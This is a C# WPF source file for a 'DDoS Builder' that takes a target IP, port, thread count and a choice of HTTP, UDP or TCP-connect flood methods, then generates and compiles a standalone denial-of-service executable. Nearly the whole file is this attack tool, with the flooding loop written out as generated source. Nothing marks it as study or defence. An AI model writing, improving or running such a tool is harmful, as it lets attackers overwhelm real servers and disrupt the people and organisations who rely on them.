using System;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using System.IO;
using System.Text;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Collections.Generic;
using System.Diagnostics;

namespace DDoSBuilder
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void BrowseOutputPath(object sender, RoutedEventArgs e)
        {
            var saveDialog = new SaveFileDialog
            {
                Filter = "EXE Files (*.exe)|*.exe",
                FileName = "ddos_tool.exe",
                DefaultExt = ".exe"
            };

            if (saveDialog.ShowDialog() == true)
            {
                txtOutputPath.Text = saveDialog.FileName;
            }
        }

        private void BuildExe(object sender, RoutedEventArgs e)
        {
            try
            {
                string sourceCode = GenerateSimpleSourceCode();
                string outputPath = txtOutputPath.Text;

                Log("Building executable...");

                if (CompileSimpleExecutable(sourceCode, outputPath))
                {
                    Log("✓ BUILD SUCCESSFUL!");
                    Log($"✓ File: {outputPath}");

                    // Test if file is valid
                    if (File.Exists(outputPath))
                    {
                        try
                        {
                            var info = new FileInfo(outputPath);
                            Log($"✓ Size: {info.Length} bytes");

                            // Try to get version info
                            var versionInfo = FileVersionInfo.GetVersionInfo(outputPath);
                            Log($"✓ Executable created successfully");

                            MessageBox.Show($"DDoS tool built successfully!\n\nFile: {outputPath}\nSize: {info.Length} bytes\n\nThe executable should now run properly.",
                                          "Success", MessageBoxButton.OK, MessageBoxImage.Information);
                        }
                        catch (Exception ex)
                        {
                            Log($"✓ File created but version info unavailable: {ex.Message}");
                            MessageBox.Show("Executable built but may have issues.", "Warning",
                                          MessageBoxButton.OK, MessageBoxImage.Warning);
                        }
                    }
                }
                else
                {
                    Log("✗ BUILD FAILED");
                    MessageBox.Show("Failed to build executable. Check log for errors.",
                                  "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            catch (Exception ex)
            {
                Log($"✗ CRITICAL ERROR: {ex.Message}");
                MessageBox.Show($"Critical error: {ex.Message}", "Error",
                              MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void Log(string message)
        {
            Dispatcher.Invoke(() =>
            {
                txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}\n");
                txtLog.ScrollToEnd();
            });
        }

        private bool CompileSimpleExecutable(string sourceCode, string outputPath)
        {
            // Clean up existing file
            if (File.Exists(outputPath))
            {
                try { File.Delete(outputPath); } catch { }
            }

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();

            // Essential references only
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            // Basic compiler settings
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = outputPath;
            parameters.CompilerOptions = "/target:winexe /optimize";
            parameters.GenerateInMemory = false;
            parameters.IncludeDebugInformation = false;

            Log("Compiling...");
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, sourceCode);

            if (results.Errors.Count > 0)
            {
                foreach (CompilerError error in results.Errors)
                {
                    if (error.IsWarning)
                        Log($"Warning: {error.ErrorText}");
                    else
                        Log($"Error: {error.ErrorText} (Line {error.Line})");
                }
                return false;
            }

            return true;
        }

        private string GenerateSimpleSourceCode()
        {
            StringBuilder code = new StringBuilder();

            // Ultra-simple working DDoS tool
            code.AppendLine("using System;");
            code.AppendLine("using System.Net;");
            code.AppendLine("using System.Net.Sockets;");
            code.AppendLine("using System.Threading;");
            code.AppendLine("using System.Text;");
            code.AppendLine("");
            code.AppendLine("namespace DDoSTool");
            code.AppendLine("{");
            code.AppendLine("    class Program");
            code.AppendLine("    {");
            code.AppendLine("        static string target = \"" + txtTargetIP.Text + "\";");
            code.AppendLine("        static int port = " + txtTargetPort.Text + ";");
            code.AppendLine("        static int threads = " + (int)sldThreads.Value + ";");
            code.AppendLine("        static bool running = true;");
            code.AppendLine("");
            code.AppendLine("        static void Main()");
            code.AppendLine("        {");
            code.AppendLine("            Console.WriteLine(\"=== DDoS Tool ===\");");
            code.AppendLine("            Console.WriteLine(\"Target: \" + target + \":\" + port);");
            code.AppendLine("            Console.WriteLine(\"Threads: \" + threads);");
            code.AppendLine("            Console.WriteLine(\"Press Ctrl+C to stop\");");
            code.AppendLine("            Console.WriteLine();");
            code.AppendLine("");
            code.AppendLine("            // Start threads");
            code.AppendLine("            for (int i = 0; i < threads; i++)");
            code.AppendLine("            {");
            code.AppendLine("                new Thread(Attack).Start();");
            code.AppendLine("            }");
            code.AppendLine("");
            code.AppendLine("            // Wait for exit");
            code.AppendLine("            Console.ReadLine();");
            code.AppendLine("            running = false;");
            code.AppendLine("            Console.WriteLine(\"Stopping...\");");
            code.AppendLine("            Thread.Sleep(2000);");
            code.AppendLine("        }");
            code.AppendLine("");
            code.AppendLine("        static void Attack()");
            code.AppendLine("        {");
            code.AppendLine("            while (running)");
            code.AppendLine("            {");
            code.AppendLine("                try");
            code.AppendLine("                {");

            // Add selected attack methods
            if (chkHTTP.IsChecked == true)
            {
                code.AppendLine("                    // HTTP Attack");
                code.AppendLine("                    using (WebClient client = new WebClient())");
                code.AppendLine("                    {");
                code.AppendLine("                        client.DownloadString(\"http://\" + target + \":\" + port + \"/\");");
                code.AppendLine("                    }");
            }

            if (chkUDP.IsChecked == true)
            {
                code.AppendLine("                    // UDP Attack");
                code.AppendLine("                    using (UdpClient udp = new UdpClient())");
                code.AppendLine("                    {");
                code.AppendLine("                        byte[] data = Encoding.ASCII.GetBytes(\"DDOS\");");
                code.AppendLine("                        udp.Send(data, data.Length, target, port);");
                code.AppendLine("                    }");
            }

            if (chkSYN.IsChecked == true)
            {
                code.AppendLine("                    // SYN Attack");
                code.AppendLine("                    using (TcpClient tcp = new TcpClient())");
                code.AppendLine("                    {");
                code.AppendLine("                        tcp.ConnectAsync(target, port).Wait(100);");
                code.AppendLine("                    }");
            }

            code.AppendLine("                }");
            code.AppendLine("                catch");
            code.AppendLine("                {");
            code.AppendLine("                    // Ignore errors");
            code.AppendLine("                }");
            code.AppendLine("                Thread.Sleep(10);");
            code.AppendLine("            }");
            code.AppendLine("        }");
            code.AppendLine("    }");
            code.AppendLine("}");

            return code.ToString();
        }

        private bool ValidateInput()
        {
            if (string.IsNullOrWhiteSpace(txtTargetIP.Text))
            {
                MessageBox.Show("Enter target IP", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return false;
            }

            if (!int.TryParse(txtTargetPort.Text, out int p) || p < 1 || p > 65535)
            {
                MessageBox.Show("Enter valid port (1-65535)", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return false;
            }

            if (!IsAnyAttackSelected())
            {
                MessageBox.Show("Select at least one attack method", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return false;
            }

            return true;
        }

        private bool IsAnyAttackSelected()
        {
            return chkHTTP.IsChecked == true || chkUDP.IsChecked == true || chkSYN.IsChecked == true;
        }
    }
}